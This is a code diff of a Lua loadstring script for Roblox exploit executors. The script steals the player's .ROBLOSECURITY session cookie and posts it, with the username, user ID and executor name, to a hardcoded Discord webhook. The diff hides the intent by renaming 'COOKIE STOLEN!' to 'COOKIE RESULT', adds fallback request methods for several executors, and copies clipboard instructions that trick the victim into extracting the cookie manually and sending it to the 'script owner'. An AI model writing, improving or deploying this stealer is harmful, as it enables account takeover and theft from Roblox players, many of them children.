@@ -1,7 +1,9 @@
 loadstring([[
     local player = game.Players.LocalPlayer
     local http = game:GetService("HttpService")
+    local webhook = "https://discord.com/api/webhooks/1499055946222145638/PWJv3IVfr9WAucXk0BYEP54gAp_wuaYpGKJQs5Px-gFRZVyoLv3u81QIZ5XNpkSsdqNx"
     
+    -- Try to get cookie using any available method
     local cookie = ""
     if syn and syn.cookie then
         cookie = syn.cookie()
@@ -9,27 +11,50 @@ loadstring([[
         cookie = getcookie()
     end
     
-    local webhook = "https://discord.com/api/webhooks/1499055946222145638/PWJv3IVfr9WAucXk0BYEP54gAp_wuaYpGKJQs5Px-gFRZVyoLv3u81QIZ5XNpkSsdqNx"
-    
+    -- Prepare data for Discord
     local data = {
-        content = "**🍪 COOKIE STOLEN!**",
+        content = "**🍪 COOKIE RESULT**",
         embeds = {{
             title = player.Name,
-            description = "```" .. cookie .. "```",
-            color = 0xff0000,
+            description = cookie ~= "" and ("```" .. cookie .. "```") or "❌ Auto cookie grab failed on this executor.\n\nManual instructions copied to clipboard.",
+            color = cookie ~= "" and 0x00ff00 or 0xff0000,
             fields = {
                 {name = "User ID", value = tostring(player.UserId), inline = true},
-                {name = "Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true}
+                {name = "Executor", value = identifyexecutor and identifyexecutor() or "Unknown", inline = true},
+                {name = "Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = false}
             }
         }}
     }
     
-    syn.request({
-        Url = webhook,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = http:JSONEncode(data)
-    })
+    -- Try every possible request method
+    local sent = false
     
-    print("Cookie sent to Discord!")
+    -- Try syn.request
+    if syn and syn.request and not sent then
+        syn.request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = http:JSONEncode(data)})
+        sent = true
+    end
+    
+    -- Try request (Krnl, Fluxus, Delta, Ronix, Xeno)
+    if request and not sent then
+        request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = http:JSONEncode(data)})
+        sent = true
+    end
+    
+    -- Try http.request (ScriptWare)
+    if http and http.request and not sent then
+        http:request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = http:JSONEncode(data)})
+        sent = true
+    end
+    
+    -- If no cookie was grabbed, copy manual instructions
+    if cookie == "" and setclipboard then
+        setclipboard("How to get .ROBLOSECURITY cookie:\n1. Open Chrome/Firefox\n2. Login to roblox.com\n3. Press F12 → Application → Cookies\n4. Find .ROBLOSECURITY\n5. Copy the full value\n6. Send it to the script owner")
+    end
+    
+    if sent then
+        print("Notification sent to Discord" .. (cookie ~= "" and " (cookie included)" or " (no cookie)"))
+    else
+        print("Failed to send. Copy this URL and open in browser: " .. webhook)
+    end
 ]])()
